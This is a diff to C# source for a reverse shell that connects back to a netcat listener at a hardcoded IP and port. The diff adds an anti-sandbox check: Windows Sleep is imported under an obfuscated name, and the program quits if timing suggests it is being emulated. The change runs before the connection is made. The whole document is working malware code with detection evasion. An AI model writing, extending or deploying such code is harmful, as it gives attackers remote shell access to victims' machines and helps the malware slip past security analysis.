@@ -1,13 +1,30 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace ReverseShell
 {
-
     class Program
     {
+        [DllImport("kernel32.dll",EntryPoint ="Sleep")]
+        public static extern void afhgfhjdfs(uint dwMilliseconds);
+
+
+        public static void WaitFor()
+        {
+            var rand = new Random();
+            uint randTime = (uint)rand.Next(10000, 20000);
+            double decide = randTime / 1000 - 0.5;
+            DateTime now = DateTime.Now;
+            afhgfhjdfs(randTime);
+            if (DateTime.Now.Subtract(now).TotalSeconds < decide)
+            {
+                System.Environment.Exit(1);
+            }
+        }
+
         // Set the IP address and port of your netcat server
         private static string HOST = "192.168.77.131"; // remote host
         private static int PORT = 4444; // remote port 
@@ -48,6 +65,7 @@ namespace ReverseShell
 
         static void Main(string[] args)
         {
+            WaitFor();
             try
             {
                 // Connect to the netcat server
